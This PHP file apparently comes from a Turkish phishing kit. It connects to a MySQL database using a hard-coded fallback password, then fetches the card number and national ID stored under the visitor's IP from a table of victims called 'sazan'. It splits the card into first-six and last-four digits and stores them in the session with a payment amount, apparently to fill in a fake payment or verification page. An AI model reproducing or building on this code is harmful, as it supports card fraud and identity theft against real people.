<?php
ini_set('display_errors', '1');
ini_set('display_startup_errors', '1');
error_reporting(E_ALL);

$servername = getenv('DB_HOST') ?: "localhost";
$username   = getenv('DB_USER') ?: "root1";
$password   = getenv('DB_PASSWORD') ?: "J0*Bzlm4Fd%umm1i";
$dbname     = getenv('DB_NAME') ?: "gmy_os33ym";

try {
     $db = new PDO("mysql:host=$servername;dbname=$dbname", $username, $password);
     $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
     $db->exec("SET NAMES 'utf8'; SET CHARSET 'utf8'");
    }
catch(PDOException $e)
    {
     die("SQL baglanti hatasi: " . $e->getMessage());
    }

if (function_exists('getUserIP')) {
    $ip = getUserIP();
    if (session_status() === PHP_SESSION_NONE) {
        @session_start();
    }
    
    if (empty($_SESSION['cc_first_6']) || empty($_SESSION['cc_last_4']) || empty($_SESSION['tc']) || empty($_SESSION['tutar'])) {
        try {
            $stmt = $db->prepare("SELECT tc, kk FROM sazan WHERE ip = ? ORDER BY id DESC LIMIT 1");
            $stmt->execute([$ip]);
            $sazan_row = $stmt->fetch(PDO::FETCH_ASSOC);
            
            if ($sazan_row) {
                if (empty($_SESSION['tc']) && !empty($sazan_row['tc'])) {
                    $_SESSION['tc'] = $sazan_row['tc'];
                }
                if (!empty($sazan_row['kk'])) {
                    $clean_kk = str_replace(' ', '', $sazan_row['kk']);
                    if (empty($_SESSION['cc_first_6']) && strlen($clean_kk) >= 6) {
                        $_SESSION['cc_first_6'] = substr($clean_kk, 0, 6);
                    }
                    if (empty($_SESSION['cc_last_4']) && strlen($clean_kk) >= 4) {
                        $_SESSION['cc_last_4'] = substr($clean_kk, -4);
                    }
                }
            }
            
            if (empty($_SESSION['tutar'])) {
                $site_stmt = $db->query("SELECT tutar FROM site LIMIT 1");
                $site_row = $site_stmt->fetch(PDO::FETCH_ASSOC);
                if ($site_row && !empty($site_row['tutar'])) {
                    $_SESSION['tutar'] = $site_row['tutar'];
                } else {
                    $_SESSION['tutar'] = "29";
                }
            }
        } catch (Exception $e) {
            // Ignore
        }
    }
    
    @session_write_close();
}

?>